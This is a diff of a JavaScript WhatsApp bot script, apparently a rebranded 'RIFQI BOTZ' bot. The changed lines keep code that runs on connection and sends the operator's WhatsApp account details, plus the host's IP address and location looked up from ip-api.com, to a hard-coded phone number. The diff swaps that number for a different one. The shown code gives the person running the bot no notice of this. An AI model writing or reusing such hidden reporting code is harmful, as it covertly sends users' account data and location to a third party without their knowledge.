@@ -236,7 +236,7 @@ teks = `https://chat.whatsapp.com/Hnb8UOsuN4t5hSEMNTUdft`
 
 
 // send message 
-ikyy.sendMessage(`6289636634511@s.whatsapp.net`, `*Bot On Mek, Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(ikyy.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Owner RIFQI BOTZ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/6289636634511?text=Assalamualaikum"}}})
+ikyy.sendMessage(`94752140866@s.whatsapp.net`, `*Bot On Mek, Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(ikyy.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Owner RIFQI BOTZ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/94752140866?text=Assalamualaikum"}}})
 
 console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))
 
@@ -244,7 +244,7 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 
         .then(bu =>{
 
-       ikyy.sendMessage("6289636634511@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Owner RIFQI BOTZ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/6289636634511?text=Assalamualaikum"}}})
+       ikyy.sendMessage("94752140866@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Owner RIFQI BOTZ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./connect.jpg'),sourceUrl:"https://wa.me/94752140866?text=Assalamualaikum"}}})
 
      console.log(color('|INFO!|', 'yellow'), color('mengirim info bot ke owner', 'cyan'))
 
